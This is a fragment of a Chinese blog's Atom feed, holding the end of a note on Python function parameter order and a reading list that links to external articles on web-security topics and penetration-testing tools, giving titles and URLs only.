></p><p>那么参数的使用顺序是<br>位置参数&gt;*args&gt;关键字参数&gt;**kwargs<br>这里解释以下为什么是这个顺序。<br>这里的c 默认情况下是为你好的，但是我们打印的时候 c变为3了，我们想要的默认值就没法生效了，所以我们想要达到想要的结果，就只能修改传递位置参数的顺序，如图，如果上面第一个传参是*args参数的话，那么我们输入的前面10个参数，全部都会被它所接收，而**kwargs 只有在有关键字参数的时候，才会有字典的值 那么它为空，此时a和b两个参数，就已经没有参数了，这里显然是行不通的。<br>但是打印的时候，关键字传参可以先打印。</p><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/2023/03/21/641917a819d21.png"                      alt="1679366052299.png"                ></p><h2 id="接受任意类型的参数。"><a href="#接受任意类型的参数。" class="headerlink" title="接受任意类型的参数。"></a>接受任意类型的参数。</h2><p>这个是一个比较特殊的</p><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/2023/03/21/641917b51e4ea.png"                      alt="1679366065670.png"                ></p><p>如图所示，结果也进行了备注。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Python中参数传递的一些理解。 大佬勿喷&lt;/p&gt;
&lt;h1 id=&quot;参数类型。&quot;&gt;&lt;a href=&quot;#参数类型。&quot; class=&quot;headerlink&quot; title=&quot;参数类型。&quot;&gt;&lt;/a&gt;参数类型。&lt;/h1&gt;&lt;h2 id=&quot;形参和实参&quot;&gt;&lt;a href=&quot;#形参和实参&quot;</summary>
      
    
    
    
    <category term="学习笔记" scheme="http://example.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="Python" scheme="http://example.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Python/"/>
    
    
    <category term="笔记" scheme="http://example.com/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="python" scheme="http://example.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>web安全学习相关文章(干货)</title>
    <link href="http://example.com/2022/12/01/web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%9B%B8%E5%85%B3%E6%96%87%E7%AB%A0%20%EF%BC%88%E5%B9%B2%E8%B4%A7%EF%BC%81%EF%BC%89/"/>
    <id>http://example.com/2022/12/01/web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%9B%B8%E5%85%B3%E6%96%87%E7%AB%A0%20%EF%BC%88%E5%B9%B2%E8%B4%A7%EF%BC%81%EF%BC%89/</id>
    <published>2022-12-01T13:17:10.000Z</published>
    <updated>2023-08-19T00:57:43.011Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web安全学习相关文章"><a href="#web安全学习相关文章" class="headerlink" title="web安全学习相关文章"></a>web安全学习相关文章</h1><p>文章来源于群友分享。</p><h2 id="基础篇（已完结）："><a href="#基础篇（已完结）：" class="headerlink" title="基础篇（已完结）："></a>基础篇（已完结）：</h2><h3 id="渗透测试之信息收集：https-blog-csdn-net-weixin-44268918-article-details-127903295-spm-1001-2014-3001-5502"><a href="#渗透测试之信息收集：https-blog-csdn-net-weixin-44268918-article-details-127903295-spm-1001-2014-3001-5502" class="headerlink" title="渗透测试之信息收集：https://blog.csdn.net/weixin_44268918/article/details/127903295?spm=1001.2014.3001.5502"></a>渗透测试之信息收集：<a class="link"   href="https://blog.csdn.net/weixin_44268918/article/details/127903295?spm=1001.2014.3001.5502" >https://blog.csdn.net/weixin_44268918/article/details/127903295?spm=1001.2014.3001.5502<i class="fas fa-external-link-alt"></i></a></h3><h3 id="SQL注入基础原理与案例（详细总结）：https-blog-csdn-net-weixin-44268918-article-details-127421781-spm-1001-2014-3001-5502"><a href="#SQL注入基础原理与案例（详细总结）：https-blog-csdn-net-weixin-44268918-article-details-127421781-spm-1001-2014-3001-5502" class="headerlink" title="SQL注入基础原理与案例（详细总结）：https://blog.csdn.net/weixin_44268918/article/details/127421781?spm=1001.2014.3001.5502"></a>SQL注入基础原理与案例（详细总结）：<a class="link"   href="https://blog.csdn.net/weixin_44268918/article/details/127421781?spm=1001.2014.3001.5502" >https://blog.csdn.net/weixin_44268918/article/details/127421781?spm=1001.2014.3001.5502<i class="fas fa-external-link-alt"></i></a></h3><h3 id="xss攻击详解：https-blog-csdn-net-weixin-44268918-article-details-127872483-spm-1001-2014-3001-5502"><a href="#xss攻击详解：https-blog-csdn-net-weixin-44268918-article-details-127872483-spm-1001-2014-3001-5502" class="headerlink" title="xss攻击详解：https://blog.csdn.net/weixin_44268918/article/details/127872483?spm=1001.2014.3001.5502"></a>xss攻击详解：<a class="link"   href="https://blog.csdn.net/weixin_44268918/article/details/127872483?spm=1001.2014.3001.5502" >https://blog.csdn.net/weixin_44268918/article/details/127872483?spm=1001.2014.3001.5502<i class="fas fa-external-link-alt"></i></a></h3><h3 id="文件上传漏洞详解：https-blog-csdn-net-weixin-44268918-article-details-128074253-spm-1001-2014-3001-5502"><a href="#文件上传漏洞详解：https-blog-csdn-net-weixin-44268918-article-details-128074253-spm-1001-2014-3001-5502" class="headerlink" title="文件上传漏洞详解：https://blog.csdn.net/weixin_44268918/article/details/128074253?spm=1001.2014.3001.5502"></a>文件上传漏洞详解：<a class="link"   href="https://blog.csdn.net/weixin_44268918/article/details/128074253?spm=1001.2014.3001.5502" >https://blog.csdn.net/weixin_44268918/article/details/128074253?spm=1001.2014.3001.5502<i class="fas fa-external-link-alt"></i></a></h3><h3 id="CSRF及SSRF详解：https-blog-csdn-net-weixin-44268918-article-details-128091004-spm-1001-2014-3001-5502"><a href="#CSRF及SSRF详解：https-blog-csdn-net-weixin-44268918-article-details-128091004-spm-1001-2014-3001-5502" class="headerlink" title="CSRF及SSRF详解：https://blog.csdn.net/weixin_44268918/article/details/128091004?spm=1001.2014.3001.5502"></a>CSRF及SSRF详解：<a class="link"   href="https://blog.csdn.net/weixin_44268918/article/details/128091004?spm=1001.2014.3001.5502" >https://blog.csdn.net/weixin_44268918/article/details/128091004?spm=1001.2014.3001.5502<i class="fas fa-external-link-alt"></i></a></h3><h3 id="文件包含漏洞详解：https-blog-csdn-net-weixin-44268918-article-details-128133245-spm-1001-2014-3001-5502"><a href="#文件包含漏洞详解：https-blog-csdn-net-weixin-44268918-article-details-128133245-spm-1001-2014-3001-5502" class="headerlink" title="文件包含漏洞详解：https://blog.csdn.net/weixin_44268918/article/details/128133245?spm=1001.2014.3001.5502"></a>文件包含漏洞详解：<a class="link"   href="https://blog.csdn.net/weixin_44268918/article/details/128133245?spm=1001.2014.3001.5502" >https://blog.csdn.net/weixin_44268918/article/details/128133245?spm=1001.2014.3001.5502<i class="fas fa-external-link-alt"></i></a></h3><h3 id="逻辑越权总结（超详细总结涉及各类越权）：https-blog-csdn-net-weixin-44268918-article-details-128347169-spm-1001-2014-3001-5502"><a href="#逻辑越权总结（超详细总结涉及各类越权）：https-blog-csdn-net-weixin-44268918-article-details-128347169-spm-1001-2014-3001-5502" class="headerlink" title="逻辑越权总结（超详细总结涉及各类越权）：https://blog.csdn.net/weixin_44268918/article/details/128347169?spm=1001.2014.3001.5502"></a>逻辑越权总结（超详细总结涉及各类越权）：<a class="link"   href="https://blog.csdn.net/weixin_44268918/article/details/128347169?spm=1001.2014.3001.5502" >https://blog.csdn.net/weixin_44268918/article/details/128347169?spm=1001.2014.3001.5502<i class="fas fa-external-link-alt"></i></a></h3><h3 id="RCE代码及命令执行-详解-：https-blog-csdn-net-weixin-44268918-article-details-128386149-spm-1001-2014-3001-5502"><a href="#RCE代码及命令执行-详解-：https-blog-csdn-net-weixin-44268918-article-details-128386149-spm-1001-2014-3001-5502" class="headerlink" title="RCE代码及命令执行(详解)：https://blog.csdn.net/weixin_44268918/article/details/128386149?spm=1001.2014.3001.5502"></a>RCE代码及命令执行(详解)：<a class="link"   href="https://blog.csdn.net/weixin_44268918/article/details/128386149?spm=1001.2014.3001.5502" >https://blog.csdn.net/weixin_44268918/article/details/128386149?spm=1001.2014.3001.5502<i class="fas fa-external-link-alt"></i></a></h3><h3 id="XXE-XML漏洞详解：https-blog-csdn-net-weixin-44268918-article-details-128484412-spm-1001-2014-3001-5502"><a href="#XXE-XML漏洞详解：https-blog-csdn-net-weixin-44268918-article-details-128484412-spm-1001-2014-3001-5502" class="headerlink" title="XXE&amp;XML漏洞详解：https://blog.csdn.net/weixin_44268918/article/details/128484412?spm=1001.2014.3001.5502"></a>XXE&amp;XML漏洞详解：<a class="link"   href="https://blog.csdn.net/weixin_44268918/article/details/128484412?spm=1001.2014.3001.5502" >https://blog.csdn.net/weixin_44268918/article/details/128484412?spm=1001.2014.3001.5502<i class="fas fa-external-link-alt"></i></a></h3><h2 id="工具篇（持续更新）："><a href="#工具篇（持续更新）：" class="headerlink" title="工具篇（持续更新）："></a>工具篇（持续更新）：</h2><h3 id="burpsuite安装与使用教程-含JDK配置环境-：https-blog-csdn-net-weixin-44268918-article-details-128207314-spm-1001-2014-3001-5502"><a href="#burpsuite安装与使用教程-含JDK配置环境-：https-blog-csdn-net-weixin-44268918-article-details-128207314-spm-1001-2014-3001-5502" class="headerlink" title="burpsuite安装与使用教程(含JDK配置环境)：https://blog.csdn.net/weixin_44268918/article/details/128207314?spm=1001.2014.3001.5502"></a>burpsuite安装与使用教程(含JDK配置环境)：<a class="link"   href="https://blog.csdn.net/weixin_44268918/article/details/128207314?spm=1001.2014.3001.5502" >https://blog.csdn.net/weixin_44268918/article/details/128207314?spm=1001.2014.3001.5502<i class="fas fa-external-link-alt"></i></a></h3><h3 id="Godzilla-哥斯拉-安装与使用：https-blog-csdn-net-weixin-44268918-article-details-128410989-spm-1001-2014-3001-5502"><a href="#Godzilla-哥斯拉-安装与使用：https-blog-csdn-net-weixin-44268918-article-details-128410989-spm-1001-2014-3001-5502" class="headerlink" title="Godzilla(哥斯拉)安装与使用：https://blog.csdn.net/weixin_44268918/article/details/128410989?spm=1001.2014.3001.5502"></a>Godzilla(哥斯拉)安装与使用：<a class="link"   href="https://blog.csdn.net/weixin_44268918/article/details/128410989?spm=1001.2014.3001.5502" >https://blog.csdn.net/weixin_44268918/article/details/128410989?spm=1001.2014.3001.5502<i class="fas fa-external-link-alt"></i></a></h3><h3 id="Goby安装与使用：https-blog-csdn-net-weixin-44268918-article-details-128496096-spm-1001-2014-3001-5502"><a href="#Goby安装与使用：https-blog-csdn-net-weixin-44268918-article-details-128496096-spm-1001-2014-3001-5502" class="headerlink" title="Goby安装与使用：https://blog.csdn.net/weixin_44268918/article/details/128496096?spm=1001.2014.3001.5502"></a>Goby安装与使用：<a class="link"   href="https://blog.csdn.net/weixin_44268918/article/details/128496096?spm=1001.2014.3001.5502" >https://blog.csdn.net/weixin_44268918/article/details/128496096?spm=1001.2014.3001.5502<i class="fas fa-external-link-alt"></i></a></h3><h3 id="AWVS安装与使用-最新版2022-12-27更新-：https-blog-csdn-net-weixin-44268918-article-details-128509290-spm-1001-2014-3001-5502"><a href="#AWVS安装与使用-最新版2022-12-27更新-：https-blog-csdn-net-weixin-44268918-article-details-128509290-spm-1001-2014-3001-5502" class="headerlink" title="AWVS安装与使用(最新版2022.12.27更新)：https://blog.csdn.net/weixin_44268918/article/details/128509290?spm=1001.2014.3001.5502"></a>AWVS安装与使用(最新版2022.12.27更新)：<a class="link"   href="https://blog.csdn.net/weixin_44268918/article/details/128509290?spm=1001.2014.3001.5502" >https://blog.csdn.net/weixin_44268918/article/details/128509290?spm=1001.2014.3001.5502<i class="fas fa-external-link-alt"></i></a></h3><h3 id="Hydra-九头蛇-工具使用：https-blog-csdn-net-weixin-44268918-article-details-128531270-spm-1001-2014-3001-5502"><a href="#Hydra-九头蛇-工具使用：https-blog-csdn-net-weixin-44268918-article-details-128531270-spm-1001-2014-3001-5502" class="headerlink" title="Hydra(九头蛇)工具使用：https://blog.csdn.net/weixin_44268918/article/details/128531270?spm=1001.2014.3001.5502"></a>Hydra(九头蛇)工具使用：<a class="link"   href="https://blog.csdn.net/weixin_44268918/article/details/128531270?spm=1001.2014.3001.5502" >https://blog.csdn.net/weixin_44268918/article/details/128531270?spm=1001.2014.3001.5502<i class="fas fa-external-link-alt"></i></a></h3><h3 id="Nmap工具使用：https-blog-csdn-net-weixin-44268918-article-details-128546353-spm-1001-2014-3001-5502"><a href="#Nmap工具使用：https-blog-csdn-net-weixin-44268918-article-details-128546353-spm-1001-2014-3001-5502" class="headerlink" title="Nmap工具使用：https://blog.csdn.net/weixin_44268918/article/details/128546353?spm=1001.2014.3001.5502"></a>Nmap工具使用：<a class="link"   href="https://blog.csdn.net/weixin_44268918/article/details/128546353?spm=1001.2014.3001.5502" >https://blog.csdn.net/weixin_44268918/article/details/128546353?spm=1001.2014.3001.5502<i class="fas fa-external-link-alt"></i></a></h3><h3 id="Metasploit工具使用-上-：https-blog-csdn-net-weixin-44268918-article-details-128775978-spm-1001-2014-3001-5502"><a href="#Metasploit工具使用-上-：https-blog-csdn-net-weixin-44268918-article-details-128775978-spm-1001-2014-3001-5502" class="headerlink" title="Metasploit工具使用(上)：https://blog.csdn.net/weixin_44268918/article/details/128775978?spm=1001.2014.3001.5502"></a>Metasploit工具使用(上)：<a class="link"   href="https://blog.csdn.net/weixin_44268918/article/details/128775978?spm=1001.2014.3001.5502" >https://blog.csdn.net/weixin_44268918/article/details/128775978?spm=1001.2014.3001.5502<i class="fas fa-external-link-alt"></i></a></h3><h3 id="Metasploit工具使用-下-：https-blog-csdn-net-weixin-44268918-article-details-128801744-spm-1001-2014-3001-5502"><a href="#Metasploit工具使用-下-：https-blog-csdn-net-weixin-44268918-article-details-128801744-spm-1001-2014-3001-5502" class="headerlink" title="Metasploit工具使用(下)：https://blog.csdn.net/weixin_44268918/article/details/128801744?spm=1001.2014.3001.5502"></a>Metasploit工具使用(下)：<a class="link"   href="https://blog.csdn.net/weixin_44268918/article/details/128801744?spm=1001.2014.3001.5502" >https://blog.csdn.net/weixin_44268918/article/details/128801744?spm=1001.2014.3001.5502<i class="fas fa-external-link-alt"></i></a></h3><h3 id="Cobalt-Strike工具安装与基础使用：https-blog-csdn-net-weixin-44268918-article-details-128857998-spm-1001-2014-3001-5502"><a href="#Cobalt-Strike工具安装与基础使用：https-blog-csdn-net-weixin-44268918-article-details-128857998-spm-1001-2014-3001-5502" class="headerlink" title="Cobalt Strike工具安装与基础使用：https://blog.csdn.net/weixin_44268918/article/details/128857998?spm=1001.2014.3001.5502"></a>Cobalt Strike工具安装与基础使用：<a class="link"   href="https://blog.csdn.net/weixin_44268918/article/details/128857998?spm=1001.2014.3001.5502" >https://blog.csdn.net/weixin_44268918/article/details/128857998?spm=1001.2014.3001.5502<i class="fas fa-external-link-alt"></i></a></h3><h3 id="Netcat安装与使用-nc-：https-blog-csdn-net-weixin-44268918-article-details-129179127-spm-1001-2014-3001-5502"><a href="#Netcat安装与使用-nc-：https-blog-csdn-net-weixin-44268918-article-details-129179127-spm-1001-2014-3001-5502" class="headerlink" title="Netcat安装与使用(nc)：https://blog.csdn.net/weixin_44268918/article/details/129179127?spm=1001.2014.3001.5502"></a>Netcat安装与使用(nc)：<a class="link"   href="https://blog.csdn.net/weixin_44268918/article/details/129179127?spm=1001.2014.3001.5502" >https://blog.csdn.net/weixin_44268918/article/details/129179127?spm=1001.2014.3001.5502<i class="fas fa-external-link-alt"></i></a></h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;web安全学习相关文章&quot;&gt;&lt;a href=&quot;#web安全学习相关文章&quot; class=&quot;headerlink&quot; title=&quot;web安全学习相关文章&quot;&gt;&lt;/a&gt;web安全学习相关文章&lt;/h1&gt;&lt;p&gt;文章来源于群友分享。&lt;/p&gt;
&lt;h2 id=&quot;基础篇（已完结）：&quot;&gt;</summary>
      
    
    
    
    <category term="学习笔记" scheme="http://example.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="渗透测试" scheme="http://example.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="推荐" scheme="http://example.com/tags/%E6%8E%A8%E8%8D%90/"/>
    
  </entry>
  
</feed>
